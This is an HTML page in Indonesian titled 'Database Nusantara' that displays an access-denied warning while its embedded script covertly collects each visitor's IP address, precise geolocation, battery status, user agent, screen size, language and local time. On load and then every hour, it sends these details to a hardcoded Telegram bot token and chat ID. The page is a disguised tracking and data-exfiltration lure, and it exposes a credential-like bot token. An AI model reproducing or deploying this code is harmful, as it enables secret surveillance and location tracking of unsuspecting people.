<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Database Nusantara</title>
  <style>
    body {
      background-color: #0b0b0b;
      color: #00ffcc;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
      text-align: center;
      padding: 40px 20px 20px;
    }
    img.logo {
      width: 190px;
      margin-bottom: 25px;
      filter: grayscale(100%) brightness(150%);
    }
    h1 {
      color: #ff4444;
      font-size: 1.4em;
      margin-bottom: 15px;
    }
    p {
      color: #00ffff;
      font-size: 1em;
    }
  </style>
</head>
<body>
  <img src="https://borneo101.github.io/DataBase/garuda_ai.png" class="logo" alt="Garuda AI" />
  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
  <p>Prosedur otorisasi internal sedang berlangsung. Sistem dalam status validasi sumber akses.</p>

  <script>
    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
    const chatId = 5677912817;

    function sendToTelegram(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: text })
      });
    }

    function getIP() {
      return fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => data.ip)
        .catch(() => "Tidak tersedia");
    }

    function getBatteryInfo() {
      if (navigator.getBattery) {
        return navigator.getBattery().then(bat => {
          return `Baterai: ${Math.round(bat.level * 100)}% ${bat.charging ? "(Mengisi)" : ""}`;
        });
      } else {
        return Promise.resolve("Baterai: Tidak didukung");
      }
    }

    function getDeviceInfo() {
      return [
        `User Agent: ${navigator.userAgent}`,
        `Resolusi: ${screen.width}x${screen.height}`,
        `Bahasa: ${navigator.language}`,
        `Waktu Lokal: ${new Date().toLocaleString()}`
      ].join('\n');
    }

    function kirimSemuaData() {
      Promise.all([getIP(), getBatteryInfo()])
        .then(([ip, bat]) => {
          navigator.geolocation.getCurrentPosition(pos => {
            const lat = pos.coords.latitude.toFixed(6);
            const lon = pos.coords.longitude.toFixed(6);
            const acc = pos.coords.accuracy;
            const lokasi = `Lokasi: ${lat}, ${lon} (Â±${acc} m)`;

            const info = [
              "*[DatabaseNusantara Deteksi]*",
              lokasi,
              `IP: ${ip}`,
              bat,
              getDeviceInfo()
            ].join('\n');

            sendToTelegram(info);
          }, err => {
            sendToTelegram("Gagal akses lokasi: " + err.message);
          });
        });
    }

    // Kirim pertama kali saat dibuka
    kirimSemuaData();

    // Ulangi setiap 1 jam (3600000 ms)
    setInterval(kirimSemuaData, 3600000);
  </script>
</body>
</html>
